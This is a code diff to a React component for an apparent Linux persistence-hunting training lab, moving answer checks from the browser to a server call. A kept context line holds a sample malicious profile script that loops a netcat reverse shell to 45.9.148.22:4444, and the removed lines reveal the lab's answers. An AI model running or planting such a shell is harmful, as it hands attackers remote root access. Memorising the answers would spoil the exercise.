@@ -1,7 +1,7 @@
 "use client";
 
 import { useState } from "react";
-import { TaskShell, MonoInput, SubmitBtn, reportWrong } from "./lab-ui";
+import { TaskShell, MonoInput, SubmitBtn, verifyStage, useRevealedFlags } from "./lab-ui";
 import { HintPanel } from "./hint-panel";
 
 /**
@@ -58,9 +58,6 @@ if [ "$(id -u)" = "0" ]; then
   (setsid /bin/bash -c 'while :; do /usr/bin/nc 45.9.148.22 4444 -e /bin/bash; sleep 300; done' &) >/dev/null 2>&1
 fi`;
 
-function normalise(v: string): string {
-  return v.trim().toLowerCase().replace(/^sage\{/, "").replace(/\}$/, "");
-}
 
 export function LinuxPersistenceHuntClient({
   labId,
@@ -70,6 +67,7 @@ export function LinuxPersistenceHuntClient({
   completedStages: string[];
 }) {
   const [completed, setCompleted] = useState<string[]>(initial);
+  const [revealed, addReveal] = useRevealedFlags(labId);
   const [tab, setTab] = useState<"cron" | "systemd" | "profile">("cron");
 
   const [t1, setT1] = useState("");
@@ -81,46 +79,40 @@ export function LinuxPersistenceHuntClient({
 
   const done = (s: string) => completed.includes(s);
 
-  async function saveStage(stage: string) {
-    await fetch("/api/labs/response", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ labId, stage, response: "correct" }),
-    });
-    setCompleted((p) => [...p, stage]);
+  function markDone(stage: string, reveal?: string) {
+    setCompleted((p) => (p.includes(stage) ? p : [...p, stage]));
+    addReveal(stage, reveal);
   }
 
-  function submitOne(e: React.FormEvent) {
+  async function submitOne(e: React.FormEvent) {
     e.preventDefault();
-    if (normalise(t1) === "45.9.148.22") {
+    const verdict = await verifyStage(labId, "task_1", t1);
+    if (verdict.correct) {
       setE1("");
-      void saveStage("task_1");
+      markDone("task_1", verdict.reveal);
     } else {
-      reportWrong(labId, "task_1");
       setE1("Look for an entry that fetches and executes remote content.");
     }
   }
 
-  function submitTwo(e: React.FormEvent) {
+  async function submitTwo(e: React.FormEvent) {
     e.preventDefault();
-    const v = normalise(t2);
-    if (v === "execstartpost" || v === "exec start post") {
+    const verdict = await verifyStage(labId, "task_2", t2);
+    if (verdict.correct) {
       setE2("");
-      void saveStage("task_2");
+      markDone("task_2", verdict.reveal);
     } else {
-      reportWrong(labId, "task_2");
       setE2("Which directive in the unit file runs the reverse shell? Name it exactly.");
     }
   }
 
-  function submitThree(e: React.FormEvent) {
+  async function submitThree(e: React.FormEvent) {
     e.preventDefault();
-    const v = normalise(t3);
-    if (v === "/etc/profile.d/01-locale-fix.sh" || v === "01-locale-fix.sh") {
+    const verdict = await verifyStage(labId, "task_3", t3);
+    if (verdict.correct) {
       setE3("");
-      void saveStage("task_3");
+      markDone("task_3", verdict.reveal);
     } else {
-      reportWrong(labId, "task_3");
       setE3("Give the file. Compare modification dates against the others.");
     }
   }
